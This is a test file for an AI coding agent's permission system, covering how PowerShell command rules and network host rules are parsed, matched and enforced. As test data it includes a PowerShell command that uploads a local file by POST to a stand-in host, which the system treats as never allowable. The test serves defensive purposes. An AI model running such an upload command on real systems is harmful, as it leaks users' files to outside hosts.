// Owner 2026-10-25: unsandboxed PowerShell gets exact `PowerShell(<command>)` rules matched on a canonical parsed form with the same strictness as Bash, and the network card's saves become `Network(<host>[:port])` host rules.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager } from "../permission-manager.js";
import { __resetActiveSandboxCapabilityForTest, __resetSandboxRequestedAtBootForTest } from "../sandbox-capability.js";
import { __resetSessionStoreForTest } from "../user-approval-store.js";
import { canonicalRuleSpecifier, normalizeRuleSpecifierInput, parseRuleSpecifier } from "../rules/rule-specifier.js";
import { buildShellRuleApproval, isWildcardShellRule, shellRuleCoversCommand } from "../rules/shell-rule-approval.js";
import { powerShellRuleShape } from "../rules/powershell-exfiltration.js";
import { validatePermissionRule } from "../rules/rule-files.js";

let dir: string;
let manager: PermissionManager;
beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "powershell-network-rules-")));
  const home = join(dir, "home");
  mkdirSync(home);
  vi.stubEnv("HOME", home);
  vi.stubEnv("USERPROFILE", home);
  vi.stubEnv("AVE_HOME", join(dir, "state"));
  manager = new PermissionManager(join(dir, "permissions.json"));
});
afterEach(() => {
  __resetSessionStoreForTest();
  __resetActiveSandboxCapabilityForTest();
  __resetSandboxRequestedAtBootForTest();
  vi.unstubAllEnvs();
  rmSync(dir, { recursive: true, force: true });
});

function powershell(command: string, runsSandboxed: boolean, extra: { headless?: boolean; sessionId?: string } = {}) {
  return manager.checkDetailed("powershell", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: dir },
    shellExecution: { runsSandboxed },
    ...extra,
  });
}

describe("PowerShell(...) rule grammar", () => {
  it.each([
    ["PowerShell(get-childitem src)", { tokens: ["get-childitem", "src"], wildcard: false }],
    ["PowerShell(git status *)", { tokens: ["git", "status"], wildcard: true }],
    ["PowerShell(get-childitem -recurse src)", { tokens: ["get-childitem", "-recurse", "src"], wildcard: false }],
  ])("parses %s", (text, expected) => {
    expect(parseRuleSpecifier(text)).toEqual({ kind: "powershell", ...expected });
    expect(canonicalRuleSpecifier(text)).toBe(text);
  });

  it("takes the canonical command and parameter spelling an edited rule is saved in", () => {
    expect(normalizeRuleSpecifierInput("  PowerShell(Get-ChildItem   -Recurse  Src) ")).toBe("PowerShell(get-childitem -recurse Src)");
    expect(normalizeRuleSpecifierInput("PowerShell(gci src *)")).toBe("PowerShell(get-childitem src *)");
    // The stored form must already be canonical: a hand-written alias or capital is refused, never mapped.
    expect(() => validatePermissionRule({ pattern: "PowerShell(Get-ChildItem src)", action: "allow" })).toThrow(/canonical/);
  });

  it.each([
    "PowerShell($env:PATH)", "PowerShell(get-content (gc x))", "PowerShell(iex 'x')", "PowerShell(a;b)",
    "PowerShell(a|b)", "PowerShell(@args)", "PowerShell(*)", "PowerShell()", "PowerShell(. ./x.ps1)", "PowerShell(gc a*b)",
  ])("refuses %s, which is not literal command text", (text) => {
    expect(() => parseRuleSpecifier(text)).toThrow();
  });
});

describe("PowerShell rule shape", () => {
  it("reads literal simple commands in canonical form and names anything else opaque", () => {
    expect(powerShellRuleShape("Get-ChildItem -Recurse src")).toEqual({ ok: true, commands: [["get-childitem", "-recurse", "src"]], opaque: null });
    expect(powerShellRuleShape("gci src | Select-Object -First 1")).toEqual({ ok: true, commands: [["get-childitem", "src"], ["select-object", "-first", "1"]], opaque: null });
    expect(powerShellRuleShape("$x = gci src")).toMatchObject({ ok: true, opaque: "assignment" });
    // A non-literal argument stays visible as null, so a deny prefix still sees the literal words before it.
    expect(powerShellRuleShape("Remove-Item $env:TEMP")).toEqual({ ok: true, commands: [["remove-item", null]], opaque: "non-literal argument" });
    expect(powerShellRuleShape("& $tool run")).toEqual({ ok: true, commands: [], opaque: "non-literal command" });
  });
});

describe("unsandboxed PowerShell runs unasked only on an exact PowerShell(...) rule", () => {
  it.each(["default", "auto", "allow"] as const)("matches the canonical form exactly in %s mode", (mode) => {
    manager.setMode(mode);
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask", layer: 6 });
    manager.setRules([{ pattern: "PowerShell(get-childitem src)", action: "allow" }]);
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "allow", layer: 3 });
    // The same command by alias or case is the same canonical argv.
    expect(powershell("gci src", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("GET-CHILDITEM src", false)).toMatchObject({ decision: "allow", layer: 3 });
    // Any other argument, a second command or an expansion is not covered.
    expect(powershell("Get-ChildItem src -Recurse", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem Src", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem src; Get-ChildItem src", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("Get-ChildItem src; Remove-Item x", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem $dir", false)).toMatchObject({ decision: "ask" });
  });

  it("never lets a wildcard allow run an unsandboxed call, and keeps it for a sandboxed one", () => {
    manager.setRules([{ pattern: "PowerShell(get-childitem *)", action: "allow" }]);
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask", layer: 6 });
    expect(powershell("Get-ChildItem src", true)).toMatchObject({ decision: "allow" });
  });

  it("keeps the dialects apart: a Bash rule never runs PowerShell, nor the reverse", () => {
    manager.setRules([{ pattern: "Bash(git status)", action: "allow" }]);
    expect(powershell("git status", false)).toMatchObject({ decision: "ask" });
    manager.setRules([{ pattern: "PowerShell(git status)", action: "allow" }]);
    expect(manager.checkDetailed("bash", "builtin", "shell", null, {
      ruleSubject: { kind: "shell", dialect: "bash", command: "git status", cwd: dir },
      shellExecution: { runsSandboxed: false },
    })).toMatchObject({ decision: "ask" });
  });

  it("never allows a floor over an exact rule", () => {
    manager.setRules([{ pattern: "PowerShell(get-content notes.txt)", action: "allow" }]);
    expect(powershell("Get-Content notes.txt", false)).toMatchObject({ decision: "allow", layer: 3 });
    manager.setRules([{ pattern: "PowerShell(invoke-webrequest -method Post -infile notes.txt https://x.test)", action: "allow" }]);
    expect(powershell("Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it("denies on a matching deny rule, wildcard included, and asks when a deny rule cannot inspect the input", () => {
    manager.setRules([{ pattern: "PowerShell(remove-item *)", action: "deny" }]);
    expect(powershell("Remove-Item -Recurse build", true)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell("ri build", false)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell("$p = 'build'; Remove-Item $p", true)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell("$p = 'build'; Write-Output $p", true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it("runs a headless unsandboxed call on its exact rule and denies one without", () => {
    expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject({ decision: "deny", layer: 6 });
    manager.setRules([{ pattern: "PowerShell(get-childitem src)", action: "allow" }]);
    expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject({ decision: "allow", layer: 3 });
  });

  it("applies a session PowerShell rule to its conversation only", () => {
    manager.addSessionRule("conversation-a", "PowerShell(get-childitem src)");
    expect(powershell("gci src", false, { sessionId: "conversation-a" })).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("gci src", false, { sessionId: "conversation-b" })).toMatchObject({ decision: "ask" });
  });
});

describe("the rules a PowerShell card offers", () => {
  it("derives the exact canonical rule and its deny for one literal command", () => {
    expect(buildShellRuleApproval("powershell", "Get-ChildItem -Recurse src", dir, { allow: true, deny: true }, "conversation-a")).toMatchObject({
      dialect: "powershell",
      exactRule: "PowerShell(get-childitem -recurse src)",
      denyRule: "PowerShell(get-childitem -recurse src)",
      denyAllowed: true,
      sessionAllowed: true,
      persistentAllowed: true,
    });
  });

  it.each(["$x = gci src", "Get-ChildItem src | Remove-Item", "Write-Host $env:USERNAME"])("offers no exact allow for %s", (command) => {
    expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
  });

  it("offers Always deny but no allow for a floor command", () => {
    const approval = buildShellRuleApproval("powershell", "Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", dir, { allow: true, deny: true }, "conversation-a");
    expect(approval).toMatchObject({ exactRule: null, persistentAllowed: false, denyRule: "PowerShell(invoke-webrequest -method Post -infile notes.txt https://x.test)" });
  });

  it("checks an edited rule against the PowerShell matcher", () => {
    expect(shellRuleCoversCommand("powershell", "PowerShell(get-childitem *)", "allow", "gci src", dir)).toBe(true);
    expect(shellRuleCoversCommand("powershell", "PowerShell(remove-item *)", "deny", "ri build", dir)).toBe(true);
    expect(shellRuleCoversCommand("powershell", "PowerShell(get-childitem other)", "allow", "gci src", dir)).toBe(false);
    expect(shellRuleCoversCommand("powershell", "Bash(gci src)", "allow", "gci src", dir)).toBe(false);
    expect(isWildcardShellRule("PowerShell(get-childitem *)")).toBe(true);
    expect(isWildcardShellRule("PowerShell(get-childitem src)")).toBe(false);
  });
});

describe("Network(...) host rules", () => {
  it.each([
    ["Network(api.example.com)", { host: "api.example.com", subdomains: false }],
    ["Network(*.example.com:443)", { host: "example.com", subdomains: true, port: 443 }],
  ])("parses %s", (text, expected) => {
    expect(parseRuleSpecifier(text)).toEqual({ kind: "network", ...expected });
    expect(canonicalRuleSpecifier(text)).toBe(text);
  });

  it.each(["Network(API.example.com)", "Network(*.com)", "Network(example.com:0)", "Network(a b)", "Network()"])("refuses %s", (text) => {
    expect(() => parseRuleSpecifier(text)).toThrow();
  });

  it("decides a destination by deny, then ask, then allow, over user, project and session rules", async () => {
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443 })).toBeUndefined();
    manager.setRules([{ pattern: "Network(*.example.com)", action: "allow" }]);
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443 })).toEqual({ decision: "allow", pattern: "Network(*.example.com)" });
    expect(await manager.networkRuleDecision({ host: "example.com", port: 443 })).toBeUndefined();
    await manager.addRulePersist({ pattern: "Network(api.example.com:443)", action: "ask" }, { kind: "project", projectCwd: dir });
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443, projectCwd: dir })).toEqual({ decision: "ask", pattern: "Network(api.example.com:443)" });
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443 })).toEqual({ decision: "allow", pattern: "Network(*.example.com)" });
    manager.addSessionRule("conversation-a", "Network(other.test)");
    expect(await manager.networkRuleDecision({ host: "other.test", port: 80, sessionId: "conversation-a" })).toEqual({ decision: "allow", pattern: "Network(other.test)" });
    expect(await manager.networkRuleDecision({ host: "other.test", port: 80, sessionId: "conversation-b" })).toBeUndefined();
    await manager.addRulePersist({ pattern: "Network(api.example.com)", action: "deny" }, { kind: "user" });
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443, projectCwd: dir })).toEqual({ decision: "deny", pattern: "Network(api.example.com)" });
  });

  it("refuses a session rule of another kind", () => {
    expect(() => manager.addSessionRule("conversation-a", "Edit(/tmp/x)")).toThrow(/session rule must be/);
  });
});
